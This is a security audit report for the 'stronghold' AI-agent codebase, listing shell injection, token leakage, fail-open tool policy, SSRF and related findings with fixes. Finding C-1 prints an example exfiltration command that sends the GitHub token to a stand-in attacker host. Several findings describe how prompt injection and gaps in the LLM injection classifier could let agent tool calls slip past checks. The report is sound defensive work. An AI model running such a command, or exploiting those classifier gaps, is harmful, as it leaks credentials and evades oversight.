# Security Review — Full-Codebase Audit (2026-04-23)

**Scope**: `src/stronghold/` (257 Python files, ~27k LOC) + `Dockerfile`, `docker-compose.yml`, `.gitleaks.toml`.
**Method**: Parallel manual audit of auth, API routes, Warden/Sentinel/Gate, tool execution, and secrets/config surfaces; Bandit SAST; spot-verification of each finding against source.
**Branch**: `claude/security-review-ehFhA` (no code changes in this review — this is a findings report only).

Severity legend: **C**ritical / **H**igh / **M**edium / **L**ow / **I**nfo. "Verified" = I read the cited code and confirmed the behavior. "Noted" = plausible from the audit pass, not independently confirmed.

---

## Executive summary

Three findings meet the bar for immediate attention:

1. **C-1 Shell injection in `tools/shell_exec.py`** — `asyncio.create_subprocess_shell` combined with a prefix-only allowlist is trivially bypassable via `;`, `&&`, `|`, `` ` ``. Any agent holding the `code_gen` group can execute arbitrary shell.
2. **C-2 GitHub token leaked through process args in `tools/workspace.py`** — the token is embedded in the `git clone` URL and passed as a positional argument to `subprocess.run`, making it visible to anything that can read `/proc/<pid>/cmdline` or `ps`.
3. **H-1 Tool-policy fail-open on config error in `container.py`** — if `create_tool_policy()` raises (e.g., missing Casbin model/policy file), `tool_policy` becomes `None` and the enforcement gate at `container.py:407` is skipped entirely; all tool calls proceed without authorization.

The rest are tractable hardening items. Overall the codebase shows mature defensive patterns: constant-time HMAC comparisons in webhooks, nonce + timestamp replay protection, regex ReDoS timeouts in Warden, Unicode NFKD normalization, an allowlist-then-interpolate pattern for dynamic SQL identifiers, and PyJWT with `audience`/`issuer` checks in the auth provider. The issues below are mostly gaps at integration points, not pervasive flaws.

---

## Critical

### C-1 Shell injection in `tools/shell_exec.py` — **Verified**

**File**: `src/stronghold/tools/shell_exec.py:155–174`

The allowlist checks `cmd_lower.startswith(p)` against prefixes like `pytest`, `git `, `ls`. The blocklist is literal substring matching for patterns like `rm -rf /`. Execution then uses `asyncio.create_subprocess_shell(command, cwd=ws, …)`, which evaluates the string through `/bin/sh -c`.

Example bypass — passes the allowlist (starts with `pytest`), does not match any blocked pattern, and exfiltrates the GitHub token:

```
pytest; curl -s https://attacker.example/$GITHUB_TOKEN
```

Other easy bypasses: `` `…` ``, `$(…)`, `|`, `&&`, and `>` redirection into `/workspace`.

**Blast radius**: any agent in the `code_gen` tool group (wired globally in `container.py:362`). Per `agents/base.py:49`, Artificer/Mason are the primary users, but the tool is registered for any caller that meets the group filter. Combined with C-2, a single prompt injection in Mason can extract `GITHUB_TOKEN` / `LITELLM_MASTER_KEY` from the host environment.

**Fix**: Switch to `asyncio.create_subprocess_exec(*shlex.split(command), …)`, resolve argv[0] against an explicit binary allowlist, and reject any command whose `shlex.split` raises or whose argv[0] isn't in the allowlist. Drop `_BLOCKED_PATTERNS` once the allowlist is structural — it's load-bearing today and trivial to bypass.

Also pass a scrubbed `env=` to the subprocess instead of inheriting the parent env (which carries `GITHUB_TOKEN`, `LITELLM_MASTER_KEY`, `ROUTER_API_KEY`, etc.).

### C-2 GitHub token leaked through process args in `tools/workspace.py` — **Verified**

**File**: `src/stronghold/tools/workspace.py:112–119`

```python
token = os.environ.get("GITHUB_TOKEN", "")
if token:
    url = f"https://x-access-token:{token}@github.com/{owner}/{repo}.git"
…
self._run(["git", "clone", "--depth=1", url, str(repo_dir)])
```

The token is embedded in the URL argument to `subprocess.run`, which places it in `/proc/<pid>/cmdline` for the lifetime of the clone. It also lands in git's reflog and in any exception message that echoes argv (the `_run` helper at line 229 raises with the first three argv elements, so the URL isn't in the raised message — good — but the clone process itself is still observable).

**Fix**: Use `GIT_ASKPASS` or a short-lived credential helper, or pipe the credential via `git -c credential.helper=…`. Never put secrets in argv.

`owner` and `repo` are also unvalidated — a prompt-injected `owner="../../etc"` will still be rejected by git's URL parsing, but an attacker-controlled repo name like `evil-org/stronghold-fork` will clone successfully. Add an allowlist of permitted org/repo pairs.

---

## High

### H-1 Tool-policy fail-open on config error — **Verified**

**File**: `src/stronghold/container.py:323–329, 407–410`

```python
try:
    tool_policy: ToolPolicyProtocol | None = create_tool_policy()
except Exception:
    logger.warning("Tool policy config not found, running without policy enforcement")
    tool_policy = None
…
if tool_policy is not None and auth is not None:
    …
    if not tool_policy.check_tool_call(user_id, org_id, name):
```

The default paths `config/tool_policy_model.conf` and `config/tool_policy.csv` are loaded at startup. If either file is missing, Casbin raises, and the process continues without tool-call authorization. A single `WARNING` log line is the only indicator.

**Fix**: Treat policy-load failure as fatal at startup unless an explicit env flag (`STRONGHOLD_DISABLE_TOOL_POLICY=1`) is set. Add a readiness-probe assertion that `container.tool_policy is not None` in production modes. Add a test: start the container with the policy files renamed and assert startup aborts.

### H-2 Webhook accepts any `X-Webhook-Org` when `webhook_org_id` is unset — **Verified**

**File**: `src/stronghold/api/routes/webhooks.py:108–129`

Bearer-secret verification, timestamp window, and nonce dedupe are all correct and use `hmac.compare_digest`. However, when `config.webhook_org_id` is empty, the handler accepts whatever `X-Webhook-Org` the caller sends and only logs a warning. Any holder of the shared webhook secret can therefore impersonate any org.

**Fix**: Require `webhook_org_id` to be set whenever the webhook endpoints are mounted; reject requests otherwise with a 503 (same pattern used when the secret is missing on line 60–62).

### H-3 Admin role/user endpoints lack strict org scoping — **Noted**

**File**: `src/stronghold/api/routes/admin.py:261–322, 399–424`

Audit report flagged that `POST /admin/users/{user_id}/approve`, `/reject`, and `PUT /admin/users/{user_id}/roles` either accept arbitrary role strings or bypass org scoping when the caller has the system-admin role. The `roles` field is not validated against an enum.

**Fix**: Enforce `org_id` in every WHERE clause on user-mutating admin queries unless the caller holds a distinct `superadmin` role; validate `roles` against a known set; require explicit `org_id` in the request body for system-admin cross-org operations (audit-logged).

### H-4 MCP server deployment lacks admin check — **Noted**

**File**: `src/stronghold/api/routes/mcp.py` (deploy endpoint)

Audit report indicates that the MCP "deploy server" endpoint authenticates the caller but does not check for the `admin` role before deploying an attacker-supplied Docker image to the K8s cluster. Verify and gate with a role check.

### H-5 SSRF surface in `/agents/import-url` — **Noted**

**File**: `src/stronghold/api/routes/agents.py:370–461`

The private-IP check (`is_private | is_loopback | is_link_local | is_reserved`) runs once at URL-parse time. DNS rebinding (re-resolve with a short TTL between the check and the fetch) can redirect to internal IPs. `follow_redirects=False` blocks HTTP-level redirects but not DNS-level.

**Fix**: Re-resolve the hostname at connect time and assert the resolved IP is still public — or use an HTTP client that lets you pin the connect IP after the check. At minimum, set a hard timeout and maximum response size on the fetch.

### H-6 Tool results bypass Sentinel when it's not configured — **Noted**

**File**: `src/stronghold/agents/strategies/react.py` (fallback path after `sentinel.post_call`)

Report indicates that when `sentinel` is None, the React strategy falls back to a direct Warden scan that misses PII redaction and structured audit logging. Also flagged that `triggers.py` and `skills.py` invoke Warden directly without going through Sentinel. Verify and consolidate on a single post-call code path.

---

## Medium

### M-1 Warden Layer 3 fails open on LLM error — **Verified, documented**

**File**: `src/stronghold/security/warden/llm_classifier.py:148–159`, `security/warden/detector.py:143–144`

The L3 LLM classifier returns `{"label": "safe", …}` on any exception, and the detector's own try/except swallows failures and falls through to `return WardenVerdict(clean=True)`. This is explicitly documented ("fail-open for availability") and only affects tool-result scanning when L1 regex + L2 heuristics + L2.5 semantic have all passed; it is not a blanket bypass. Still, a sophisticated payload that only the LLM layer catches will slip through during provider outages.

**Recommendation**: Make the fail-open policy configurable. For tenants with strict tool-result hygiene requirements, default to fail-closed (`clean=False, blocked=True, flags=("l3_unavailable",)`).

### M-2 Demo-cookie middleware doesn't verify JWT `issuer` — **Verified**

**File**: `src/stronghold/api/middleware/demo_cookie.py:74–79` vs. `security/auth_demo_cookie.py:73–80`

The middleware's pre-check decodes with `audience="stronghold"` only; the provider in the composite chain additionally validates `issuer="stronghold-demo"`. The inconsistency is defense-in-depth overlap rather than a bypass (the provider re-checks), but it weakens the middleware's pre-injection filter.

**Fix**: Add `issuer="stronghold-demo"` to the middleware decode.

### M-3 PBKDF2 iteration count below current NIST guidance — **Noted**

**File**: `src/stronghold/security/auth_jwt.py` (or wherever legacy PBKDF2 verify lives; audit cited line 232)

Uses 600,000 iterations. SP 800-63B (2024) recommends ≥ 1,000,000 for PBKDF2-HMAC-SHA256. Low immediate risk; bump on next rotation and add a re-hash-on-login path.

### M-4 Dockerfile: `chmod 777 /workspace`, runs as root — **Verified**

**File**: `Dockerfile:34`, no `USER` directive

`/workspace` is world-writable and the container runs as root. In K8s the `securityContext` can override, but the image itself sets a bad baseline.

**Fix**: `RUN useradd -r -u 1000 stronghold && mkdir -p /workspace && chown stronghold:stronghold /workspace && chmod 750 /workspace` + `USER stronghold`.

### M-5 docker-compose: hardcoded `postgres:stronghold/stronghold`, Redis has no AUTH — **Verified**

**File**: `docker-compose.yml:40–42`

Dev defaults only, but the header comment (`cp .env.example .env && edit .env && docker compose up -d`) doesn't actually cause the compose file to pick up a `.env` override for Postgres — the `environment:` block hardcodes them. Redis isn't in compose today, but cache code supports it; ensure any added Redis service requires `requirepass`.

**Fix**: Parameterize via `${POSTGRES_PASSWORD}` with no default, and fail fast if unset.

### M-6 Tracing spans aren't scrubbed before export — **Noted**

**File**: `src/stronghold/tracing/phoenix_backend.py:52–58`

Reports `span.set_attribute("input", str(data)[:1000])` without redaction. LLM inputs frequently carry secrets (pasted tokens, API keys in troubleshooting threads) or PII. For Arize Phoenix exports, add a redaction pass (regex for `sk-[a-zA-Z0-9]{20,}`, `ey[A-Za-z0-9_-]+\.`, email addresses) before `set_attribute`.

### M-7 Task policy defaults unknown priority tiers to allow — **Noted**

**File**: `src/stronghold/security/task_policy.py:101–103`

Reported: `if not limits: return True`. An unknown/typo'd tier skips budget enforcement. Fix: unknown tier → deny, and log loudly.

---

## Low

- **L-1** Path-traversal check in `tools/file_ops.py:60–62` uses `str(target).startswith(str(ws.resolve()))`. Symlink escape and case-insensitive-FS pitfalls. Prefer `target.resolve().is_relative_to(ws.resolve())` with an exception handler.
- **L-2** Skill-scan regex (`parser.py:55–79`) catches literal `exec`/`eval`/`importlib` but not `__import__`, `globals()['__builtins__']`, or `getattr(builtins, 'exec')`. Static AST analysis is more robust than regex.
- **L-3** `auth_composite.py:43` swallows `Exception` from each provider. If a provider raises for a non-auth reason (network glitch, bug), it's treated the same as "wrong credentials" and the next provider tries. This is intentional fail-through but means bugs in early providers are silent. Log provider name + exception class at DEBUG.
- **L-4** `.gitleaks.toml` allowlist regex `sk-example-[a-zA-Z0-9-]+` would also permit a real secret that happened to be pasted with an `sk-example-` prefix. Tighten to `sk-example-[a-z0-9]{1,16}$` or similar.
- **L-5** Forged skills are pinned to trust tier `t3` (`forge.py:141–152`), but there is no runtime *capability* restriction that prevents a `t3` skill from calling `shell_exec`. Tier is an attribute, not a gate. Add a tier→tool-group allowlist and enforce at `tool_dispatcher`.
- **L-6** `pg_outcomes.py` and `api/routes/profile.py` both interpolate column names via f-strings after an allowlist check. The allowlists are correct today and Bandit's B608 flag is a false positive, but the pattern is fragile — add a unit test that asserts rejected identifiers raise and review on every schema change.
- **L-7** Demo-cookie auth uses `ROUTER_API_KEY` as its HS256 signing key (`auth_demo_cookie.py:34–40`). If the router key is ever leaked or short, an attacker can mint arbitrary demo sessions with any claims. Enforce a minimum key length of 32 bytes at *startup*, not just a runtime warning.

---

## Info / not findings

- **Composite auth is fail-closed**, not fail-open. `CompositeAuthProvider.authenticate` raises `ValueError("Authentication failed")` after all providers fail (`auth_composite.py:49–51`). One audit pass claimed otherwise; that claim doesn't hold up.
- **`DemoCookieAuthProvider` does verify `issuer`** (`auth_demo_cookie.py:79`). Only the middleware pre-check doesn't (see M-2).
- **Webhook signature uses `hmac.compare_digest`** (`webhooks.py:70`) — constant-time, correct.
- **Warden L1 regex runs with a per-pattern timeout** via the `regex` library (`detector.py:30, 73`) — ReDoS-mitigated.
- **Bandit**: 0 HIGH, 3 MEDIUM (all false positives — string-built SQL with strict allowlist on identifiers), 24 LOW. The MEDIUM hits are annotated with `# noqa: S608` and guarded by set-membership checks. No hardcoded real secrets.

---

## Recommended next actions (in order)

1. Patch `shell_exec.py` to use `create_subprocess_exec` + structural argv allowlist + scrubbed env (C-1).
2. Remove the token from `git clone` argv; use `GIT_ASKPASS` (C-2).
3. Make tool-policy load failure fatal by default (H-1).
4. Require `webhook_org_id` at mount time (H-2).
5. Verify & fix H-3 through H-6 against source; they were flagged by the parallel audit pass but not independently verified in this review.
6. Schedule follow-ups for M-1 (configurable L3 fail policy) and M-6 (tracing redaction) — these require design decisions, not one-line fixes.

---

*Review generated 2026-04-23. See `ARCHITECTURE.md §3.6` for the phase-gated security-review checkpoints; this is an ad-hoc full-codebase pass, not a release gate.*
